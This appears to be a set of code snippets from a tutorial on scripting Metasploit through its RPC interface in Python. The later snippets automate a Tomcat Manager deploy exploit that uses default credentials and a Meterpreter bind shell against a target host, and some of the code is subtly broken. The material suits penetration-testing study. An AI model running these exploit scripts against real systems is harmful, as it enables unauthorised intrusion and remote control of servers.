["```py\n./msfconsole\n\nmsfconsole msf exploit(handler) > load msgrpc User = msf Pass = password\n[*] MSGRPC Service: 127.0.0.1:55553\n[*] MSGRPC Username: user\n[*] MSGRPC Password: password\n[*] Successfully loaded plugin: msgrpc msf exploit(handler) >\n```", "```py\n./msfrpcd -h\n\nUsage: msfrpcd <options>\nOPTIONS:\n-P <opt> Specify the password to access msfrpcd\n-S Disable SSL on the RPC socket\n-U <opt> Specify the username to access msfrpcd\n-a <opt> Bind to this IP address\n-f Run the daemon in the foreground\n-h Help banner\n-n Disable database\n-p <opt> Bind to this port instead of 55553\n-u <opt> URI for web server\n```", "```py\n./msfrpcd -U msf -P password -p 55553 -n -f\n```", "```py\ngit clone git://github.com/SpiderLabs/msfrpc.git msfrpc\ncd msfrpc/python-msfrpc\npython setup.py install\n```", "```py\nimport msfrpc\n\n# Create a new instance of the Msfrpc client with the default options\nclient = msfrpc.Msfrpc({'port':55553})\n\n# Login to the msfmsg server\nclient.login(user,password)\n```", "```py\nimport msfrpc\n\nclient = msfrpc.Msfrpc({'uri':'/msfrpc', 'port':'5553', 'host':'127.0.0.1', 'ssl': True})\nauth = client.login('msf','password')\n    if auth:\n        print str(client.call('core.version'))+'\\n'\n        print str(client.call('core.thread_list', []))+'\\n'\n        print str(client.call('job.list', []))+'\\n'\n        print str(client.call('module.exploits', []))+'\\n'\n        print str(client.call('module.auxiliary', []))+'\\n'\n        print str(client.call('module.post', []))+'\\n'\n        print str(client.call('module.payloads', []))+'\\n'\n        print str(client.call('module.encoders', []))+'\\n'\n        print str(client.call('module.nops', []))+'\\n'\n```", "```py\ntry:        \n    res = client.call('console.create')        \n    console_id = res['id']\nexcept:        \n    print \"Console create failed\\r\\n\"        \n    sys.exit()\n```", "```py\nimport msfrpc\n\nusername='msf'\npassword=\u2019password\u2019\n\n# Create a new instance of the Msfrpc client with the default options\nclient = msfrpc.Msfrpc({'port':55553})\n\n# Login in Metasploit server\nclient.login(username,password)\n\n# Get a list of the exploits from the server\nexploits = client.call('module.exploits')\n\n# Get the list of compatible payloads for the first option\npayloads= client.call('module.compatible_payloads',[mod['modules'][0]])\nfor i in (payloads.get('payloads')):\n    print(\"\\t%s\" % i)\n```", "```py\n# -*- encoding: utf-8 -*-\nimport msfrpc\nimport time\n\nclient = msfrpc.Msfrpc({'uri':'/msfrpc', 'port':'5553', 'host':'127.0.0.1', 'ssl': True})\nauth = client.login('msf','password')\n\nif auth:\n\n    console = client.call('console.create')\n    #read commands from the file commands_file.txt\n    file = open (\"commands_file.txt\", 'r')\n    commands = file.readlines()\n    file.close()\n\n    # Execute each of the commands that appear in the file\n    print(len(commands))\n    for command in commands:\n        resource = client.call('console.write',[console['id'], command])\n        processData(console['id'])\n```", "```py\ndef processData(consoleId):\n    while True:\n        readedData = self.client.call('console.read',[consoleId])\n        print(readedData['data'])\n        if len(readedData['data']) > 1:\n            print(readedData['data'])\n        if readedData[\u2018busy\u2019] == True:\n            time.sleep(1)\n            continue\n        break\n```", "```py\nimport msfrpc\nimport time\n\ndef exploit(RHOST, RPORT):\n    client = msfrpc.Msfrpc({})\n    client.login('msf', 'password')\n    ress = client.call('console.create')\n    console_id = ress['id']\n\n    ## Exploit TOMCAT MANAGER ##\n    commands = \"\"\"use exploit/multi/http/tomcat_mgr_deploy\n    set PATH /manager\n    set HttpUsername tomcat\n    set HttpPassword tomcat\n    set RHOST \"\"\"+RHOST+\"\"\"\n    set RPORT \"\"\"+RPORT+\"\"\"\n    set payload java/meterpreter/bind_tcp\n    exploit\n    \"\"\"\n\n    print(\"[+] Exploiting TOMCAT MANAGER on: \"+RHOST)\n    client.call('console.write',[console_id,commands])\n    res = client.call('console.read',[console_id])\n    result = res['data'].split('n')\n\ndef main():\n    parser = optparse.OptionParser(sys.argv[0] +' -h RHOST -p LPORT')parser.add_option('-h', dest='RHOST', type='string', help='Specify a remote host')\n    parser.add_option('-p', dest='LPORT', type='string', help ='specify a port to listen ')\n    (options, args) = parser.parse_args()\n    RHOST=options.RHOST\n    LPORT=options.LPORT\n\n    if (RHOST == None) and (RPORT == None):\n        print parser.usage\n        sys.exit(0)\n\n    exploit(RHOST, RPORT)\n\nif __name__ == \"__main__\":\n    main()\n```", "```py\n$ git clone https://github.com/allfro/pyMetasploit.git $ cd pyMetasploit\n$ python setup.py install\n```", "```py\n>>> from Metasploit.msfrpc import MsfRpcClient\n>>> client = MsfRpcClient('password',user='msf')\n```", "```py\n>>> client.modules.auxiliary\n >>> client.modules.encoders\n >>> client.modules.payloads\n >>> client.modules.post\n```", "```py\nfrom Metasploit.msfrpc import MsfRpcClient\nfrom Metasploit.msfconsole import MsfRpcConsole\n\nclient = MsfRpcClient('password', user='msf')\n\nexploits = client.modules.exploits\nfor exploit in exploits:\n    print(\"\\t%s\" % exploit)\n\nscan = client.modules.use('exploits', 'multi/http/tomcat_mgr_deploy')\nscan.description\nscan.required\nscan['RHOST'] = '192.168.100.2'\nscan['RPORT'] = '8180'\nscan['PATH'] = '/manager'\nscan['HttpUsername'] = 'tomcat'\nscan['HttpPassword'] = 'tomcat'\nscan['payload'] = 'java/meterpreter/bind_tcp'\nprint(scan.execute())\n\nconsole = MsfRpcConsole(client)\nconsole.execute('use exploit/multi/http/tomcat_mgr_deploy')\nconsole.execute('set RHOST 192.168.100.2')\nconsole.execute('set RPORT 8180')\nconsole.execute('set PATH /manager')\nconsole.execute('set HttpUsername tomcat')\nconsole.execute('set HttpPassword tomcat')\nconsole.execute('set payload java/meterpreter/bind_tcp')\nconsole.execute('run')\n```"]